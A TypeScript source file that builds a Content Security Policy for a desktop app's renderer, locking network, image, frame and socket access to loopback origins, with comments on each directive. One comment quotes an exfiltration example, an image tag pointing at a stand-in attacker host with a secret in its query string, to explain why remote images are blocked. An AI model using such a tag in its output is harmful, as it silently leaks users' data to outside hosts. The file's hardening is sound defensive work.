// CSP for the renderer. The daemon is loopback-only, so network access is
// pinned to 127.0.0.1 (REST + SSE over http, terminal mux over ws). The policy is injected here
// rather than written into index.html so the serve variant can differ: the
// same directives apply in dev, relaxed only where the dev server itself
// needs it. Enforcing CSP in dev keeps dev/packaged parity — a connect-src
// gap then fails on the developer's screen, not weeks later in a packaged
// build.
export function contentSecurityPolicy(mode: "build" | "serve"): string {
	return [
		"default-src 'self'",
		// react-refresh injects its inline preamble in serve mode; a hash is
		// impractical because the preamble changes with the plugin version.
		mode === "serve" ? "script-src 'self' 'unsafe-inline'" : "script-src 'self'",
		"style-src 'self' 'unsafe-inline'",
		// No remote origins: markdown in agent output could otherwise render
		// <img src="https://attacker/?q=secret"> and leak data with no script.
		// Remote images (avatars, previews, README images) are fetched by the
		// main process (chatImage:fetch) and shown as data: URLs; images in agent
		// output additionally wait for a click.
		"img-src 'self' data: http://127.0.0.1:* http://*.localhost:*",
		"media-src 'self' http://127.0.0.1:* http://*.localhost:*",
		"font-src 'self' data:",
		[
			"connect-src",
			"'self'",
			"http://127.0.0.1:*",
			"ws://127.0.0.1:*",
			// Session artifact files are read from the daemon's artifact preview
			// origin (ao-preview-artifact.<id>.localhost:<port>), a subdomain of
			// localhost that 'self' and 127.0.0.1 do not cover.
			"http://*.localhost:*",
			// Vite serves on localhost, which 'self' does not cover for the ws://
			// HMR socket.
			mode === "serve" ? "ws://localhost:*" : "",
		]
			.filter(Boolean)
			.join(" "),
		"object-src 'none'",
		"base-uri 'none'",
		// Agent HTML renders (RenderFrame) are the only frames: sandboxed pages
		// served by the loopback daemon.
		// 'self' lets dev:web, whose API base is relative, frame a page; the page
		// keeps its own sandbox from the daemon's CSP header either way.
		// *.localhost is the inline-artifact origin an HTML artifact is framed from.
		"frame-src 'self' http://127.0.0.1:* http://*.localhost:*",
	].join("; ");
}

// Response header served by the app:// protocol handler. frame-ancestors is
// ignored in a <meta> policy, so it only takes effect here.
export function rendererCspHeader(): string {
	return `${contentSecurityPolicy("build")}; frame-ancestors 'none'`;
}
